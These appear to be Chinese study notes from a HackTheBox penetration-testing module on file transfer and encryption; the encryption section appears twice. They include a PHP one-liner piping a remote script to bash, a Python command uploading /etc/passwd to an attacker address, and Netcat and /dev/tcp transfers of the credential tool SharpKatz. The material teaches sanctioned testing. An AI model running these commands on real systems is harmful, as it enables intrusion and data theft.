#### PHP 下载文件并通过管道传输到 Bash

PHP 下载文件并通过管道传输到 Bash

```shell-session
tr01ax@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**注意:** 如果启用了 fopen 包装器（fopen wrappers），URL 可以作为文件名与 @file 函数一起使用。

---

## 其他语言

^dd72a9

`Ruby` 和 `Perl` 是其他流行的语言，也可用于传输文件。这两种编程语言也支持使用 `-e` 选项从操作系统命令行运行单行命令。

---

#### Ruby - 下载文件

Ruby - 下载文件

```shell-session
tr01ax@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

#### Perl - 下载文件

Perl - 下载文件

```shell-session
tr01ax@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

## JavaScript

^e9a638

JavaScript 是一种脚本或编程语言，允许你在网页上实现复杂的功能。与其他编程语言一样，我们可以将其用于许多不同的用途。

以下 JavaScript 代码基于 [这篇](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) 帖子，我们可以使用它来下载文件。我们将创建一个名为 `wget.js` 的文件并保存以下内容：

Code: javascript

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

我们可以从 Windows 命令提示符或 PowerShell 终端使用以下命令来执行我们的 JavaScript 代码并下载文件。

#### 使用 JavaScript 和 cscript.exe 下载文件

使用 JavaScript 和 cscript.exe 下载文件

```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---

## VBScript

^31ae1b

[VBScript](https://en.wikipedia.org/wiki/VBScript)（"Microsoft Visual Basic Scripting Edition"，微软 Visual Basic 脚本编辑版）是由微软开发的一种活动脚本语言，以 Visual Basic 为模型。自 Windows 98 以来，VBScript 已默认安装在每个 Microsoft Windows 桌面版本中。

以下 VBScript 示例可以基于 [这篇](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs) 帖子使用。我们将创建一个名为 `wget.vbs` 的文件并保存以下内容：

Code: vbscript

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

我们可以从 Windows 命令提示符或 PowerShell 终端使用以下命令来执行我们的 VBScript 代码并下载文件。

#### 使用 VBScript 和 cscript.exe 下载文件

使用 VBScript 和 cscript.exe 下载文件

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---

## 使用 Python3 进行上传操作

^f95651

如果我们想上传文件，我们需要了解特定编程语言中执行上传操作的函数。Python3 [requests 模块](https://pypi.org/project/requests/) 允许你使用 Python 发送 HTTP 请求（GET、POST、PUT 等）。如果我们想将文件上传到我们的 Python3 [uploadserver](https://github.com/Densaugeo/uploadserver)，可以使用以下代码。

#### 启动 Python uploadserver 模块

启动 Python uploadserver 模块

```shell-session
tr01ax@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### 使用 Python 单行命令上传文件

使用 Python 单行命令上传文件

```shell-session
tr01ax@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

让我们将这个单行命令分解成多行以更好地理解每个部分。

Code: python

```python
# To use the requests function, we need to import the module first.
import requests

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file.
r = requests.post(url,files={"files":file})
```

我们可以使用任何其他编程语言执行相同的操作。一个好的实践是选择一种语言并尝试构建一个上传程序。

---

## 章节回顾

了解如何使用代码下载和上传文件可能有助于我们在红队演练、渗透测试、CTF 竞赛、事件响应演练、取证调查，甚至日常系统管理工作中实现目标。#filetransfer #hacking
[source](https://academy.hackthebox.com/module/24/section/161)


我们已经介绍了在 Windows 和 Linux 上传输文件的各种方法。我们还介绍了使用不同编程语言实现相同目标的方法，但还有更多的方法和应用程序可供使用。

本节将介绍替代方法，如使用 [Netcat](https://en.wikipedia.org/wiki/Netcat)、[Ncat](https://nmap.org/ncat/) 传输文件，以及使用 RDP 和 PowerShell 会话。

---

## Netcat

[Netcat](https://sectools.org/tool/netcat/)（通常缩写为 `nc`）是一个计算机网络实用程序，用于使用 TCP 或 UDP 从网络连接读取和写入数据，这意味着我们可以将其用于文件传输操作。

原始 Netcat 于 1995 年由 Hobbit [发布](http://seclists.org/bugtraq/1995/Oct/0028.html)，但尽管它很受欢迎，却没有得到维护。这个工具的灵活性和实用性促使 Nmap 项目开发了 [Ncat](https://nmap.org/ncat/)，这是一个现代的重新实现版本，支持 SSL、IPv6、SOCKS 和 HTTP 代理、连接代理等功能。

在本节中，我们将同时使用原始 Netcat 和 Ncat。

**注意:** 在 HackTheBox 的 PwnBox 中，**Ncat** 被用作 nc、ncat 和 netcat。

## 使用 Netcat 和 Ncat 进行文件传输

目标机器或攻击机器都可以用于发起连接，这在防火墙阻止访问目标时非常有用。让我们创建一个示例并将工具传输到我们的目标。

在此示例中，我们将从 Pwnbox 将 [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) 传输到被攻陷的机器。我们将使用两种方法来完成。让我们先看第一种方法。

我们首先在被攻陷的机器上启动 Netcat（`nc`），使用 `-l` 选项进行监听，使用 `-p 8000` 选项选择要监听的端口，并使用单个大于号 `>` 将 [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin))（标准输出）重定向到文件名 `SharpKatz.exe`。

#### NetCat - 被攻陷的机器 - 在端口 8000 上监听

NetCat - 被攻陷的机器 - 在端口 8000 上监听

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

如果被攻陷的机器使用 Ncat，我们需要指定 `--recv-only` 以在文件传输完成后关闭连接。

#### Ncat - 被攻陷的机器 - 在端口 8000 上监听

Ncat - 被攻陷的机器 - 在端口 8000 上监听

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

从我们的攻击主机，我们将使用 Netcat 连接到被攻陷机器的 8000 端口，并将文件 [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) 作为输入发送到 Netcat。`-q 0` 选项将告诉 Netcat 在完成后关闭连接。这样，我们就能知道文件传输何时完成。

#### Netcat - 攻击主机 - 向被攻陷的机器发送文件

Netcat - 攻击主机 - 向被攻陷的机器发送文件

```shell-session
tr01ax@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
tr01ax@htb[/htb]$ # Example using Original Netcat
tr01ax@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

通过在攻击主机上使用 Ncat，我们可以选择 `--send-only` 而不是 `-q`。当在连接和监听模式下使用 `--send-only` 标志时，Ncat 会在输入耗尽后终止。通常，Ncat 会继续运行直到网络连接关闭，因为远程端可能会传输额外的数据。但是，使用 `--send-only` 时，无需预期进一步的传入信息。

#### Ncat - 攻击主机 - 向被攻陷的机器发送文件

Ncat - 攻击主机 - 向被攻陷的机器发送文件

```shell-session
tr01ax@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
tr01ax@htb[/htb]$ # Example using Ncat
tr01ax@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

除了在被攻陷的机器上监听，我们还可以连接到攻击主机上的端口来执行文件传输操作。这种方法在防火墙阻止入站连接的场景中非常有用。让我们在 Pwnbox 上监听 443 端口，并将文件 [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) 作为输入发送到 Netcat。

#### 攻击主机 - 将文件作为输入发送到 Netcat

攻击主机 - 将文件作为输入发送到 Netcat

```shell-session
tr01ax@htb[/htb]$ # Example using Original Netcat
tr01ax@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### 被攻陷的机器连接到 Netcat 接收文件

被攻陷的机器连接到 Netcat 接收文件

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

让我们用 Ncat 执行相同的操作：

#### 攻击主机 - 将文件作为输入发送到 Ncat

攻击主机 - 将文件作为输入发送到 Ncat

```shell-session
tr01ax@htb[/htb]$ # Example using Ncat
tr01ax@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### 被攻陷的机器连接到 Ncat 接收文件

被攻陷的机器连接到 Ncat 接收文件

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

如果被攻陷的机器上没有 Netcat 或 Ncat，Bash 支持在伪设备文件 [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html) 上进行读/写操作。

向这个特殊文件写入会使 Bash 打开一个到 `host:port` 的 TCP 连接，此功能可用于文件传输。

#### NetCat - 将文件作为输入发送到 Netcat

NetCat - 将文件作为输入发送到 Netcat

```shell-session
tr01ax@htb[/htb]$ # Example using Original Netcat
tr01ax@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - 将文件作为输入发送到 Netcat

Ncat - 将文件作为输入发送到 Netcat

```shell-session
tr01ax@htb[/htb]$ # Example using Ncat
tr01ax@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### 被攻陷的机器使用 /dev/tcp 连接到 Netcat 接收文件

被攻陷的机器使用 /dev/tcp 连接到 Netcat 接收文件

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**注意:** 相同的操作可用于将文件从被攻陷的主机传输到我们的 Pwnbox。

---

## PowerShell 会话文件传输

我们已经讨论过使用 PowerShell 进行文件传输，但可能存在 HTTP、HTTPS 或 SMB 不可用的场景。如果是这种情况，我们可以使用 [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)（PowerShell 远程处理），也称为 WinRM，来执行文件传输操作。

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) 允许我们使用 PowerShell 会话在远程计算机上执行脚本或命令。管理员通常使用 PowerShell Remoting 来管理网络中的远程计算机，我们也可以将其用于文件传输操作。默认情况下，启用 PowerShell Remoting 会同时创建 HTTP 和 HTTPS 监听器。监听器在默认端口 TCP/5985（HTTP）和 TCP/5986（HTTPS）上运行。

要在远程计算机上创建 PowerShell Remoting 会话，我们需要管理访问权限，成为 `Remote Management Users` 组的成员，或在会话配置中具有 PowerShell Remoting 的显式权限。让我们创建一个示例，在 `DC01` 和 `DATABASE01` 之间传输文件。

我们在 `DC01` 上有一个 `Administrator` 会话，该用户在 `DATABASE01` 上具有管理权限，并且 PowerShell Remoting 已启用。让我们使用 Test-NetConnection 确认我们可以连接到 WinRM。

#### 从 DC01 - 确认 DATABASE01 上的 WinRM 端口 TCP 5985 是开放的

从 DC01 - 确认 DATABASE01 上的 WinRM 端口 TCP 5985 是开放的

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

从 DC01 - 确认 DATABASE01 上的 WinRM 端口 TCP 5985 是开放的

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

因为此会话已经对 `DATABASE01` 具有权限，我们不需要指定凭据。在下面的示例中，将创建一个到名为 `DATABASE01` 的远程计算机的会话，并将结果存储在名为 `$Session` 的变量中。

#### 创建到 DATABASE01 的 PowerShell Remoting 会话

创建到 DATABASE01 的 PowerShell Remoting 会话

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

我们可以使用 `Copy-Item` cmdlet 将文件从本地机器 `DC01` 复制到我们拥有的 `DATABASE01` 会话 `$Session`，或者反过来。

#### 将 samplefile.txt 从本地主机复制到 DATABASE01 会话

将 samplefile.txt 从本地主机复制到 DATABASE01 会话

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### 将 DATABASE.txt 从 DATABASE01 会话复制到本地主机

将 DATABASE.txt 从 DATABASE01 会话复制到本地主机

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## RDP

RDP（Remote Desktop Protocol，远程桌面协议）在 Windows 网络中常用于远程访问。我们可以通过复制粘贴使用 RDP 传输文件。我们可以右键单击并从连接的 Windows 机器复制文件，然后粘贴到 RDP 会话中。

如果我们从 Linux 连接，可以使用 `xfreerdp` 或 `rdesktop`。在撰写本文时，`xfreerdp` 和 `rdesktop` 允许从目标机器复制到 RDP 会话，但在某些场景中可能无法按预期工作。

作为复制粘贴的替代方案，我们可以在目标 RDP 服务器上挂载本地资源。`rdesktop` 或 `xfreerdp` 可用于在远程 RDP 会话中公开本地文件夹。

#### 使用 rdesktop 挂载 Linux 文件夹

使用 rdesktop 挂载 Linux 文件夹

```shell-session
tr01ax@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### 使用 xfreerdp 挂载 Linux 文件夹

使用 xfreerdp 挂载 Linux 文件夹

```shell-session
tr01ax@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

要访问该目录，我们可以连接到 `\\tsclient\`，这允许我们在 RDP 会话中传输文件。

![image](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

或者，从 Windows，可以使用原生的 [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) 远程桌面客户端。

![image](https://academy.hackthebox.com/storage/modules/24/rdp.png)

选择驱动器后，我们可以在随后的远程会话中与其交互。

**注意:** 此驱动器对登录到目标计算机的任何其他用户都不可访问，即使他们设法劫持了 RDP 会话也是如此。

---

## 熟能生巧

值得参考本节内容或创建自己关于这些技术的笔记，并将其应用于渗透测试工作角色路径及其他模块中的实验室。一些可能派上用场的模块/章节包括：

- `Active Directory Enumeration and Attacks`（Active Directory 枚举与攻击） - 技能评估 1 和 2
- 整个 `Pivoting, Tunnelling & Port Forwarding`（跳板、隧道和端口转发）模块
- 整个 `Attacking Enterprise Networks`（攻击企业网络）模块
- 整个 `Shells & Payloads`（Shell 与载荷）模块

在开始实验室（或真实评估）之前，你永远不知道会面对什么。一旦你掌握了本节或本模块其他章节中的一种技术，就尝试另一种。当你完成渗透测试工作角色路径时，最好已经尝试过大多数（如果不是全部）这些技术。这将有助于你的"肌肉记忆"，并在面对具有某些限制使一种简单方法失败的不同环境时给你提供如何上传/下载文件的想法。在下一节中，我们将讨论在处理敏感数据时如何保护我们的文件传输。#filetransfer #hacking [source](https://academy.hackthebox.com/module/24/section/684)

作为渗透测试人员，我们经常获得高度敏感数据的访问权限，例如用户列表、凭据（例如，下载 NTDS.dit 文件用于离线密码破解）、以及可能包含有关组织网络基础设施和 Active Directory (AD) 环境等关键信息的枚举数据。因此，必须加密此数据或使用加密的数据连接，如 SSH、SFTP 和 HTTPS。但是，有时这些选项对我们不可用，需要采用不同的方法。

注意：除非客户明确要求，我们不建议从客户环境中泄露个人身份信息（PII，Personally Identifiable Information）、财务数据（例如信用卡号）、商业机密等数据。相反，如果要测试数据丢失防护（DLP，Data Loss Prevention）控制/出口过滤保护，请创建一个模拟客户试图保护的数据的虚拟数据文件。

因此，在传输之前加密数据或文件通常是必要的，以防止数据在传输过程中被截获时被读取。

渗透测试期间的数据泄露可能对渗透测试人员、其公司和客户产生严重后果。作为信息安全专业人员，我们必须专业且负责任地行事，并采取一切措施保护我们在评估期间遇到的任何数据。

---
## Windows 上的文件加密

有许多不同的方法可用于加密 Windows 系统上的文件和信息。最简单的方法之一是使用 [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell 脚本。这个脚本体积小巧，可以对文件和字符串进行加密。

#### Invoke-AESEncryption.ps1

Invoke-AESEncryption.ps1

```powershell-session

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.

.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="

Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin

Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"

.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes

Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

我们可以使用之前介绍的任何文件传输方法将此文件传输到目标主机。脚本传输完成后，只需将其作为模块导入即可，如下所示。

#### 导入模块 Invoke-AESEncryption.ps1

Import Module Invoke-AESEncryption.ps1

```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

脚本导入后，可以加密字符串或文件，如以下示例所示。此命令创建一个与加密文件同名但扩展名为 "`.aes`" 的加密文件。

#### 文件加密示例

File Encryption Example

```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

在每次渗透测试中使用非常`强壮`且`唯一`的密码进行加密至关重要。这是为了防止敏感文件和信息被泄露和破解的单一密码所解密。

---

## Linux 上的文件加密

[OpenSSL](https://www.openssl.org/) 经常包含在 Linux 发行版中，系统管理员使用它来生成安全证书等。OpenSSL 可以用于以 "nc 风格" 发送文件并加密文件。

要使用 `openssl` 加密文件，我们可以选择不同的加密算法（cipher），参见 [OpenSSL 手册页](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html)。让我们以 `-aes256` 为例。我们还可以使用 `-iter 100000` 选项覆盖默认迭代次数，并添加 `-pbkdf2` 选项使用 PBKDF2（Password-Based Key Derivation Function 2，基于密码的密钥派生函数 2）算法。按下回车键后，我们需要提供密码。

#### 使用 openssl 加密 /etc/passwd

Encrypting /etc/passwd with openssl

```shell-session
tr01ax@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:
```

请记住使用强壮且唯一的密码，以避免在未授权方获取文件时遭受暴力破解攻击。要解密文件，我们可以使用以下命令：

#### 使用 openssl 解密 passwd.enc

Decrypt passwd.enc with openssl

```shell-session
tr01ax@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

enter aes-256-cbc decryption password:
```

我们可以使用之前介绍的任何方法来传输此文件，但建议使用安全的传输方法，如 HTTPS、SFTP 或 SSH。一如既往，在本模块或其他模块的目标主机上练习本节中的示例，并尽可能重现（例如在 Pwnbox 上使用 `openssl` 示例）。以下部分将介绍通过 HTTP 和 HTTPS 传输文件的不同方法。#filetransfer #hacking [source](https://academy.hackthebox.com/module/24/section/684)

---

作为渗透测试人员，我们经常获取高度敏感的数据，如用户列表、凭据（例如，下载 NTDS.dit 文件用于离线密码破解），以及可能包含有关组织网络基础设施和 Active Directory (AD) 环境等关键信息的枚举数据。因此，加密这些数据或使用加密数据连接（如 SSH、SFTP 和 HTTPS）至关重要。然而，有时这些选项对我们不可用，需要采用不同的方法。

注意：除非客户特别要求，我们不建议从客户环境中外泄 PII（Personally Identifiable Information，个人身份信息）、财务数据（如信用卡号）、商业机密等数据。相反，如果尝试测试 DLP（Data Loss Prevention，数据泄露防护）控制/出口过滤保护，请创建一个包含模拟客户试图保护的数据的虚拟数据文件。

因此，在传输之前加密数据或文件通常是必要的，以防止数据在传输过程中被截获和读取。

渗透测试期间的数据泄露可能对渗透测试人员、其公司和客户造成严重后果。作为信息安全专业人员，我们必须以专业和负责任的态度行事，并采取一切措施保护我们在评估过程中遇到的任何数据。

---

## Windows 上的文件加密

有许多不同的方法可用于加密 Windows 系统上的文件和信息。最简单的方法之一是使用 [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell 脚本。这个脚本体积小巧，可以对文件和字符串进行加密。

#### Invoke-AESEncryption.ps1

  Invoke-AESEncryption.ps1

```powershell-session

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.

.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="

Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin

Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"

.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes

Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

我们可以使用之前介绍的任何文件传输方法将此文件传输到目标主机。脚本传输完成后，只需将其作为模块导入即可，如下所示。

#### 导入模块 Invoke-AESEncryption.ps1

  Import Module Invoke-AESEncryption.ps1

```powershell-session
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
```

脚本导入后，可以加密字符串或文件，如以下示例所示。此命令创建一个与加密文件同名但扩展名为 "`.aes`" 的加密文件。

#### 文件加密示例

  File Encryption Example

```powershell-session
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

File encrypted to C:\htb\scan-results.txt.aes
PS C:\htb> ls

    Directory: C:\htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
-a----        11/18/2020  12:19 PM           1724 scan-results.txt
-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
```

在每次渗透测试中使用非常`强壮`且`唯一`的密码进行加密至关重要。这是为了防止敏感文件和信息被泄露和破解的单一密码所解密。

---

## Linux 上的文件加密

